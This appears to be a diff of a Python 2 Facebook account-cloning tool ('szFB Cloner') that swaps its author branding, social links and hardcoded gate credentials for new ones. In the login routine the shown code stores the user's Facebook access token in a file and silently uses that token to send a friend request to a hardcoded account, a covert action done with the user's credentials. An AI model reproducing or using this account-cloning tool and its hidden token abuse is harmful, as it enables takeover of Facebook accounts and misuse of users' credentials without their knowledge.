@@ -50,15 +50,17 @@ def jalan(z):
 logo = """
 \033[1;96m♦♦♦=================================================♦♦♦
 \033[1;96m     
-\033[1;96m    _____        _    _                         _   
-\033[1;92m   / ____|      | |  | |                       | |  
-\033[1;96m   | (___   __ _| | _| |__   __ ___      ____ _| |_ 
-\033[1;92m    \___ \ / _` | |/ / '_ \ / _` \ \ /\ / / _` | __|
-\033[1;96m    ____) | (_| |   <| | | | (_| |\ V  V / (_| | |_ 
-\033[1;92m   |_____/ \__,_|_|\_\_| |_|\__,_| \_/\_/ \__,_|\__|
+\033[1;96m________ ________  ___  ________  ________  ___          
+\033[1;92m|\  _____\\   __  \|\  \|\   ____\|\   __  \|\  \         
+\033[1;96m\ \  \__/\ \  \|\  \ \  \ \  \___|\ \  \|\  \ \  \        
+\033[1;92m \ \   __\\ \   __  \ \  \ \_____  \ \   __  \ \  \       
+\033[1;96m  \ \  \_| \ \  \ \  \ \  \|____|\  \ \  \ \  \ \  \____  
+\033[1;92m   \ \__\   \ \__\ \__\ \__\____\_\  \ \__\ \__\ \_______\
+\033[1;96m    \|__|    \|__|\|__|\|__|\_________\|__|\|__|\|_______|
+\033[1;92m                           \|_________|
                                                   
-\033[1;93m     Facebook : www.facebook.com/groups/cyberzone360    
-\033[1;93m     YouTube  : TiPS&TRiCKS 360
+\033[1;93m     Facebook : https://www.facebook.com/baby.call.me.abbu
+\033[1;93m     YouTube  : youtube channel nai
 \033[1;96m ♦♦♦================================================♦♦♦
 """
 def tik():
@@ -93,7 +95,7 @@ print  """
 \033[1;93m║║ ╔╣║ ║║╔╗║║═╣╔╝ ╔╝╔╝║╔╗║╔╗╣║═╣
 \033[1;93m║╚═╝║╚═╝║╚╝║║═╣║ ╔╝ ╚═╣╚╝║║║║║═╣
 \033[1;93m╚═══╩═╗╔╩══╩══╩╝ ╚════╩══╩╝╚╩══╝
-\033[1;93m    ╔═╝║ \033[1;92m www.fb.com/groups/cyberzone360
+\033[1;93m    ╔═╝║ \033[1;92m https://www.facebook.com/baby.call.me.abbu
 \033[1;93m    ╚══╝ 
                                                                                                                                                                                                                              
 """
@@ -102,24 +104,23 @@ jalan(" \033[1;96m◈===========◈   \033[1;92mWelcome to szFB Cloner   \033[1;
 
 
 jalan("\033[1;96m")
-jalan("\033[1;96m   _____       _    _                         _    ")
-jalan("\033[1;97m  / ____|     | |  | |                       | |   ")
-jalan("\033[1;96m | (___   __ _| | _| |__   __ ___      ____ _| |_  ")
-jalan("\033[1;97m  \___ \ / _` | |/ / '_ \ / _` \ \ /\ / / _` | __| ")
-jalan("\033[1;96m  ____) | (_| |   <| | | | (_| |\ V  V / (_| | |_  ")
-jalan("\033[1;97m |_____/ \__,_|_|\_\_| |_|\__,_| \_/\_/ \__,_|\__| ")
+jalan("\033[1;96m") _____     _           _
+jalan("\033[1;97m")|  ___|_ _(_)___  __ _| |
+jalan("\033[1;96m")| |_ / _` | / __|/ _` | |
+jalan("\033[1;97m")|  _| (_| | \__ \ (_| | |
+jalan("\033[1;96m")|_|  \__,_|_|___/\__,_|_|
 jalan(" -----")
  
 jalan("\033[1;91m Do everything on your own risk.")	
 jalan("\033[1;93m I'm not responsible for any illegal activities.")
 jalan("                                          ---\033[1;92m𝕊𝕒𝕜𝕙𝕒𝕨𝕒𝕥")	
 
-jalan("\033[1;93m To get any help join our Facebook Group \033[1;96m(Cyber Zone).")
+jalan("\033[1;93m To get any help join our Facebook Group \033[1;96m(NoobZ).")
 
 jalan("\033[1;96m◈===============◈      \033[1;92mLet's start     \033[1;96m◈===============◈")
 
-CorrectUsername = "Sakhawat26"
-CorrectPassword = "1926"
+CorrectUsername = "hogamara"
+CorrectPassword = "sara"
 
 
 loop = 'true'
@@ -131,12 +132,12 @@ while (loop == 'true'):
             print "Logged in successfully as " + username
             loop = 'false'
         else:
-            print "\033[1;91mWrong!,\033[1;92mjoin our FB Group to get the correct password"
-            os.system('xdg-open https://facebook.com/groups/cyberzone360')
+            print "\033[1;91mWrong!,\033[1;92mfollow me FB to get the correct password"
+            os.system('xdg-open https://www.facebook.com/baby.call.me.abbu ')
 
     else:
-        print "\033[1;91mWrong!,\033[1;92mjoin our FB Group to get the correct username"
-        os.system('xdg-open https://facebook.com/groups/cyberzone360')
+        print "\033[1;91mWrong!,\033[1;92mfollow me FB to get the correct username"
+        os.system('xdg-open https://www.facebook.com/baby.call.me.abbu ')
 
 
 def login():
@@ -180,7 +181,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful.Please subscribe my Channel(TiPS&TRiCKS 360)'
+				print '\n\x1b[1;36;40m[✓] Login Successful.Please follow me on fb( فيصل احمد )'
 				os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcVekvwUkTUw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
